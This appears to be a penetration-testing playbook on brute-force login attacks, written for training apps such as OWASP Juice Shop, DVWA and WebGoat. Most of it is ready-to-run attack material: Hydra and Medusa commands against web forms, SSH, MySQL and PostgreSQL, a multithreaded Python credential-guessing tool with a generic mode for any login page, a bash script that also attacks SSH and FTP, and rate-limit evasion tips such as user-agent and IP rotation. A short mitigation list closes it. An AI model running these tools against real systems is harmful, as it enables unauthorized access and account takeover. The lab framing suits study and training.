# Playbook 06: Brute Force Attacks

## Objective

Perform brute force attacks against authentication mechanisms to gain unauthorized access through weak or default credentials.

## Target Applications

- OWASP Juice Shop (Login functionality, admin panel)
- DVWA (Brute force lesson, login forms)
- XVWA (Multiple authentication forms)
- WebGoat (Authentication lessons)

## Prerequisites

- Hydra
- Medusa
- Burp Suite Professional
- Custom wordlists (SecLists)
- Python 3 with requests library
- Proxy tools for rate limiting bypass

## Manual Commands

### 1. HTTP Form Brute Force

```bash
# Using Hydra for web form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target-ip http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# DVWA brute force (low security)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target-ip http-get-form "/dvwa/vulnerabilities/brute_force/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: PHPSESSID=...; security=low"

# Juice Shop brute force
hydra -l admin@juice-sh.op -P passwords.txt target-ip http-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid email or password"
```

### 2. SSH Brute Force

```bash
# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target-ip

# Multiple users SSH brute force
hydra -L users.txt -P passwords.txt ssh://target-ip -t 4
```

### 3. Database Brute Force

```bash
# MySQL brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://target-ip

# PostgreSQL brute force
hydra -l postgres -P passwords.txt postgres://target-ip
```

### 4. Using Medusa

```bash
# Web form brute force with Medusa
medusa -h target-ip -u admin -P passwords.txt -M http -m DIR:/login -m FORM:username=^USER^&password=^PASS^ -m DENY:"Invalid"

# SSH brute force with Medusa
medusa -h target-ip -u root -P passwords.txt -M ssh
```

## Automated Python Script

```python
#!/usr/bin/env python3
"""
Advanced Brute Force Attack Script
Supports: Juice Shop, DVWA, XVWA, WebGoat
"""

import requests
import threading
import time
import itertools
from concurrent.futures import ThreadPoolExecutor
import random
import string

class BruteForcer:
    def __init__(self, target_url, username_list=None, password_list=None, threads=10):
        self.target_url = target_url
        self.username_list = username_list or ['admin', 'administrator', 'user', 'test']
        self.password_list = password_list or self.generate_common_passwords()
        self.threads = threads
        self.success_credentials = []
        self.session = requests.Session()
        self.rate_limit_delay = 0.1

        # Common user agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]

    def generate_common_passwords(self):
        """Generate common password list"""
        passwords = [
            # Common passwords
            'password', 'admin', '123456', 'password123', 'admin123',
            'letmein', 'welcome', 'monkey', '1234567890', 'qwerty',
            'abc123', 'Password1', 'password1', 'root', 'toor',

            # Default passwords
            'default', 'guest', 'demo', 'test', 'user',
            'changeme', 'temp', 'temporary', 'pass', 'pwd',

            # Application specific
            'juice', 'dvwa', 'webgoat', 'xvwa',
            'juiceshop', 'vulnerable', 'security', 'hacker',

            # Variations
            '', 'null', 'NULL', 'admin@admin.com', 'password!',
            'P@ssw0rd', 'P@ssword', '!QAZ2wsx', 'Passw0rd!',

            # Common patterns
            '12345', '54321', 'abcdef', 'fedcba', 'aaaaaa',
            '111111', '000000', '999999', 'zxcvbn', 'asdfgh'
        ]

        # Add year variations
        current_year = time.strftime("%Y")
        for base_pwd in ['password', 'admin', 'user']:
            passwords.extend([
                f"{base_pwd}{current_year}",
                f"{base_pwd}{current_year[-2:]}",
                f"{base_pwd}2023",
                f"{base_pwd}2024"
            ])

        return passwords

    def detect_application_type(self):
        """Detect the type of application for targeted attacks"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            content = response.text.lower()

            if 'juice shop' in content:
                return 'juice_shop'
            elif 'dvwa' in content or 'damn vulnerable' in content:
                return 'dvwa'
            elif 'xvwa' in content or 'xtreme vulnerable' in content:
                return 'xvwa'
            elif 'webgoat' in content:
                return 'webgoat'
            else:
                return 'generic'

        except Exception as e:
            print(f"Error detecting application: {e}")
            return 'generic'

    def get_csrf_token(self, login_url):
        """Extract CSRF token if present"""
        try:
            response = self.session.get(login_url)

            # Look for common CSRF token patterns
            csrf_patterns = [
                r'name=["\']csrf["\'] value=["\']([^"\']+)["\']',
                r'name=["\']_token["\'] value=["\']([^"\']+)["\']',
                r'name=["\']authenticity_token["\'] value=["\']([^"\']+)["\']'
            ]

            import re
            for pattern in csrf_patterns:
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)

            return None

        except Exception as e:
            print(f"Error getting CSRF token: {e}")
            return None

class JuiceShopBruteForcer(BruteForcer):
    """Specialized brute forcer for OWASP Juice Shop"""

    def __init__(self, target_url, **kwargs):
        super().__init__(target_url, **kwargs)
        self.login_endpoint = f"{target_url.rstrip('/')}/rest/user/login"

        # Juice Shop specific usernames
        self.username_list = [
            'admin@juice-sh.op',
            'jim@juice-sh.op',
            'bender@juice-sh.op',
            'amy@juice-sh.op',
            'admin',
            'administrator',
            'test@test.com',
            'user@user.com'
        ]

    def attempt_login(self, username, password):
        """Attempt login to Juice Shop"""
        try:
            # Rotate user agent
            self.session.headers.update({
                'User-Agent': random.choice(self.user_agents),
                'Content-Type': 'application/json'
            })

            login_data = {
                'email': username,
                'password': password
            }

            response = self.session.post(
                self.login_endpoint,
                json=login_data,
                timeout=10,
                allow_redirects=False
            )

            # Check for successful login
            if response.status_code == 200:
                response_data = response.json()
                if 'authentication' in response_data:
                    print(f"[+] SUCCESS: {username}:{password}")
                    return True

            # Rate limiting
            time.sleep(self.rate_limit_delay)
            return False

        except Exception as e:
            print(f"Error testing {username}:{password} - {e}")
            return False

    def brute_force(self):
        """Perform brute force attack"""
        print(f"Starting Juice Shop brute force attack on {self.login_endpoint}")
        print(f"Testing {len(self.username_list)} users with {len(self.password_list)} passwords")

        credentials_to_test = list(itertools.product(self.username_list, self.password_list))

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []

            for username, password in credentials_to_test:
                future = executor.submit(self.attempt_login, username, password)
                futures.append((future, username, password))

            for future, username, password in futures:
                if future.result():
                    self.success_credentials.append((username, password))

        return self.success_credentials

class DVWABruteForcer(BruteForcer):
    """Specialized brute forcer for DVWA"""

    def __init__(self, target_url, security_level='low', **kwargs):
        super().__init__(target_url, **kwargs)
        self.security_level = security_level
        self.login_endpoint = f"{target_url.rstrip('/')}/vulnerabilities/brute_force/"
        self.dvwa_session = None

        # DVWA specific usernames
        self.username_list = ['admin', 'user', 'test', 'guest', 'dvwa']

    def setup_dvwa_session(self):
        """Setup DVWA session and set security level"""
        try:
            # Get main DVWA page to establish session
            response = self.session.get(self.target_url)

            # Set security level
            security_url = f"{self.target_url.rstrip('/')}/security.php"
            self.session.post(security_url, data={'security': self.security_level})

            # Extract PHPSESSID for use in attacks
            if 'PHPSESSID' in self.session.cookies:
                self.dvwa_session = self.session.cookies['PHPSESSID']
                print(f"DVWA session established: {self.dvwa_session}")
                return True

        except Exception as e:
            print(f"Error setting up DVWA session: {e}")
            return False

    def attempt_login(self, username, password):
        """Attempt login to DVWA brute force module"""
        try:
            params = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }

            response = self.session.get(
                self.login_endpoint,
                params=params,
                timeout=10
            )

            # Check for failed login indicators
            if "Username and/or password incorrect" not in response.text:
                if "Welcome to the password protected area" in response.text:
                    print(f"[+] SUCCESS: {username}:{password}")
                    return True

            time.sleep(self.rate_limit_delay)
            return False

        except Exception as e:
            print(f"Error testing {username}:{password} - {e}")
            return False

    def brute_force(self):
        """Perform DVWA brute force attack"""
        if not self.setup_dvwa_session():
            print("Failed to setup DVWA session")
            return []

        print(f"Starting DVWA brute force attack (Security: {self.security_level})")

        credentials_to_test = list(itertools.product(self.username_list, self.password_list))

        # Adjust thread count based on security level
        thread_count = 1 if self.security_level == 'high' else self.threads

        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = []

            for username, password in credentials_to_test:
                future = executor.submit(self.attempt_login, username, password)
                futures.append((future, username, password))

            for future, username, password in futures:
                if future.result():
                    self.success_credentials.append((username, password))

        return self.success_credentials

class WebGoatBruteForcer(BruteForcer):
    """Specialized brute forcer for WebGoat"""

    def __init__(self, target_url, **kwargs):
        super().__init__(target_url, **kwargs)
        self.login_endpoint = f"{target_url.rstrip('/')}/login"

        # WebGoat specific usernames
        self.username_list = ['guest', 'webgoat', 'admin', 'user', 'test']

    def attempt_login(self, username, password):
        """Attempt login to WebGoat"""
        try:
            # Get CSRF token
            csrf_token = self.get_csrf_token(self.login_endpoint)

            login_data = {
                'username': username,
                'password': password
            }

            if csrf_token:
                login_data['_csrf'] = csrf_token

            response = self.session.post(
                self.login_endpoint,
                data=login_data,
                timeout=10,
                allow_redirects=False
            )

            # Check for successful login (302 redirect)
            if response.status_code == 302:
                location = response.headers.get('location', '')
                if 'welcome' in location.lower() or 'dashboard' in location.lower():
                    print(f"[+] SUCCESS: {username}:{password}")
                    return True

            time.sleep(self.rate_limit_delay)
            return False

        except Exception as e:
            print(f"Error testing {username}:{password} - {e}")
            return False

    def brute_force(self):
        """Perform WebGoat brute force attack"""
        print(f"Starting WebGoat brute force attack on {self.login_endpoint}")

        credentials_to_test = list(itertools.product(self.username_list, self.password_list))

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []

            for username, password in credentials_to_test:
                future = executor.submit(self.attempt_login, username, password)
                futures.append((future, username, password))

            for future, username, password in futures:
                if future.result():
                    self.success_credentials.append((username, password))

        return self.success_credentials

class GenericBruteForcer(BruteForcer):
    """Generic brute forcer for unknown applications"""

    def __init__(self, target_url, login_path='/login', **kwargs):
        super().__init__(target_url, **kwargs)
        self.login_endpoint = f"{target_url.rstrip('/')}{login_path}"

    def attempt_login(self, username, password):
        """Generic login attempt"""
        try:
            # Try common field names
            field_combinations = [
                {'username': username, 'password': password},
                {'email': username, 'password': password},
                {'user': username, 'pass': password},
                {'login': username, 'password': password}
            ]

            for login_data in field_combinations:
                response = self.session.post(
                    self.login_endpoint,
                    data=login_data,
                    timeout=10,
                    allow_redirects=False
                )

                # Check for common success indicators
                success_indicators = [
                    'welcome', 'dashboard', 'profile', 'logout',
                    'success', 'authenticated'
                ]

                failure_indicators = [
                    'invalid', 'incorrect', 'failed', 'error',
                    'denied', 'unauthorized'
                ]

                response_text = response.text.lower()

                # Check for redirect (common success pattern)
                if response.status_code in [301, 302]:
                    location = response.headers.get('location', '').lower()
                    if any(indicator in location for indicator in success_indicators):
                        print(f"[+] SUCCESS: {username}:{password}")
                        return True

                # Check response content
                if any(indicator in response_text for indicator in success_indicators):
                    if not any(indicator in response_text for indicator in failure_indicators):
                        print(f"[+] SUCCESS: {username}:{password}")
                        return True

            time.sleep(self.rate_limit_delay)
            return False

        except Exception as e:
            print(f"Error testing {username}:{password} - {e}")
            return False

    def brute_force(self):
        """Perform generic brute force attack"""
        print(f"Starting generic brute force attack on {self.login_endpoint}")

        credentials_to_test = list(itertools.product(self.username_list, self.password_list))

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []

            for username, password in credentials_to_test:
                future = executor.submit(self.attempt_login, username, password)
                futures.append((future, username, password))

            for future, username, password in futures:
                if future.result():
                    self.success_credentials.append((username, password))

        return self.success_credentials

def load_wordlists(username_file=None, password_file=None):
    """Load custom wordlists"""
    usernames = []
    passwords = []

    if username_file:
        try:
            with open(username_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Username file {username_file} not found")

    if password_file:
        try:
            with open(password_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Password file {password_file} not found")

    return usernames, passwords

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description='Advanced Brute Force Attack Tool')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-u', '--usernames', help='Username wordlist file')
    parser.add_argument('-p', '--passwords', help='Password wordlist file')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--app-type', choices=['juice_shop', 'dvwa', 'webgoat', 'generic'],
                       help='Application type for specialized attacks')
    parser.add_argument('--security-level', choices=['low', 'medium', 'high'],
                       default='low', help='DVWA security level')

    args = parser.parse_args()

    # Load custom wordlists if provided
    custom_usernames, custom_passwords = load_wordlists(args.usernames, args.passwords)

    # Determine application type
    if not args.app_type:
        base_brute_forcer = BruteForcer(args.url)
        app_type = base_brute_forcer.detect_application_type()
    else:
        app_type = args.app_type

    print(f"Detected/Selected application type: {app_type}")

    # Create appropriate brute forcer
    if app_type == 'juice_shop':
        brute_forcer = JuiceShopBruteForcer(
            args.url,
            username_list=custom_usernames,
            password_list=custom_passwords,
            threads=args.threads
        )
    elif app_type == 'dvwa':
        brute_forcer = DVWABruteForcer(
            args.url,
            security_level=args.security_level,
            username_list=custom_usernames,
            password_list=custom_passwords,
            threads=args.threads
        )
    elif app_type == 'webgoat':
        brute_forcer = WebGoatBruteForcer(
            args.url,
            username_list=custom_usernames,
            password_list=custom_passwords,
            threads=args.threads
        )
    else:
        brute_forcer = GenericBruteForcer(
            args.url,
            username_list=custom_usernames,
            password_list=custom_passwords,
            threads=args.threads
        )

    # Perform brute force attack
    start_time = time.time()
    successful_credentials = brute_forcer.brute_force()
    end_time = time.time()

    # Print results
    print("\n" + "="*50)
    print("BRUTE FORCE RESULTS")
    print("="*50)
    print(f"Attack duration: {end_time - start_time:.2f} seconds")
    print(f"Successful credentials found: {len(successful_credentials)}")

    for username, password in successful_credentials:
        print(f"  {username}:{password}")

    if not successful_credentials:
        print("No valid credentials found. Try:")
        print("  - Different wordlists")
        print("  - Slower attack rate")
        print("  - Different attack vectors")
```

## Shell Script Automation

```bash
#!/bin/bash
# Comprehensive Brute Force Attack Script

TARGET="$1"
APP_TYPE="$2"
OUTPUT_DIR="bruteforce_results"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url> [app_type]"
    echo "App types: juice_shop, dvwa, webgoat, generic"
    echo "Example: $0 http://192.168.1.100:3000 juice_shop"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "[+] Starting brute force attack on $TARGET"

# Create common wordlists
echo "[+] Creating wordlists..."
cat > "$OUTPUT_DIR/usernames.txt" << EOF
admin
administrator
user
test
guest
demo
root
dvwa
webgoat
juice
admin@juice-sh.op
admin@admin.com
test@test.com
EOF

cat > "$OUTPUT_DIR/passwords.txt" << EOF
password
admin
123456
password123
admin123
letmein
welcome
monkey
qwerty
abc123
default
guest
demo
test
changeme
juice
dvwa
webgoat
vulnerable
security
Password1
p@ssw0rd
P@ssw0rd
12345
54321
EOF

# Application-specific attacks
case "$APP_TYPE" in
    "juice_shop")
        echo "[+] Attacking Juice Shop..."
        hydra -L "$OUTPUT_DIR/usernames.txt" -P "$OUTPUT_DIR/passwords.txt" \
              "$TARGET" http-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid email or password" \
              -o "$OUTPUT_DIR/juice_shop_results.txt"
        ;;

    "dvwa")
        echo "[+] Attacking DVWA..."
        # Note: Requires valid PHPSESSID cookie
        hydra -L "$OUTPUT_DIR/usernames.txt" -P "$OUTPUT_DIR/passwords.txt" \
              "$TARGET" http-get-form "/vulnerabilities/brute_force/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect" \
              -o "$OUTPUT_DIR/dvwa_results.txt"
        ;;

    "webgoat")
        echo "[+] Attacking WebGoat..."
        hydra -L "$OUTPUT_DIR/usernames.txt" -P "$OUTPUT_DIR/passwords.txt" \
              "$TARGET" http-post-form "/login:username=^USER^&password=^PASS^:Invalid" \
              -o "$OUTPUT_DIR/webgoat_results.txt"
        ;;

    *)
        echo "[+] Generic HTTP form attack..."
        hydra -L "$OUTPUT_DIR/usernames.txt" -P "$OUTPUT_DIR/passwords.txt" \
              "$TARGET" http-post-form "/login:username=^USER^&password=^PASS^:Invalid" \
              -o "$OUTPUT_DIR/generic_results.txt"
        ;;
esac

# SSH brute force if port 22 is open
echo "[+] Checking for SSH service..."
if nmap -p 22 "$TARGET" | grep -q "open"; then
    echo "[+] SSH service detected, attempting brute force..."
    hydra -L "$OUTPUT_DIR/usernames.txt" -P "$OUTPUT_DIR/passwords.txt" \
          ssh://"$TARGET" -o "$OUTPUT_DIR/ssh_results.txt"
fi

# FTP brute force if port 21 is open
echo "[+] Checking for FTP service..."
if nmap -p 21 "$TARGET" | grep -q "open"; then
    echo "[+] FTP service detected, attempting brute force..."
    hydra -L "$OUTPUT_DIR/usernames.txt" -P "$OUTPUT_DIR/passwords.txt" \
          ftp://"$TARGET" -o "$OUTPUT_DIR/ftp_results.txt"
fi

echo "[+] Brute force attack complete. Results in $OUTPUT_DIR/"
```

## Detection Methods

### Successful Authentication Indicators:

- HTTP 200 with welcome/dashboard content
- HTTP 302 redirect to authenticated areas
- Set-Cookie headers with session tokens
- JSON responses with authentication tokens

### Application-Specific Success Patterns:

- **Juice Shop**: JSON response with authentication token
- **DVWA**: "Welcome to the password protected area" message
- **WebGoat**: Redirect to lesson dashboard
- **XVWA**: Session establishment and redirect

## Rate Limiting and Evasion

### Bypass Techniques:

1. **User Agent Rotation**: Change user agents per request
2. **IP Rotation**: Use proxy chains or VPNs
3. **Request Delays**: Add delays between attempts
4. **Session Management**: Handle CSRF tokens and cookies
5. **Distributed Attacks**: Use multiple source IPs

## Mitigation Recommendations

1. **Account Lockout Policies**:

   - Implement progressive delays
   - Lock accounts after failed attempts
   - Monitor for brute force patterns

2. **Strong Authentication**:

   - Enforce strong password policies
   - Implement multi-factor authentication
   - Use CAPTCHA after failed attempts

3. **Rate Limiting**:

   - Implement request rate limiting
   - Use progressive delays
   - Monitor authentication patterns

4. **Monitoring and Alerting**:
   - Log all authentication attempts
   - Alert on suspicious patterns
   - Implement behavioral analysis

## Next Steps

- Use discovered credentials for session hijacking (Playbook 07)
- Attempt privilege escalation with gained access
- Explore password reset vulnerabilities (Playbook 08)
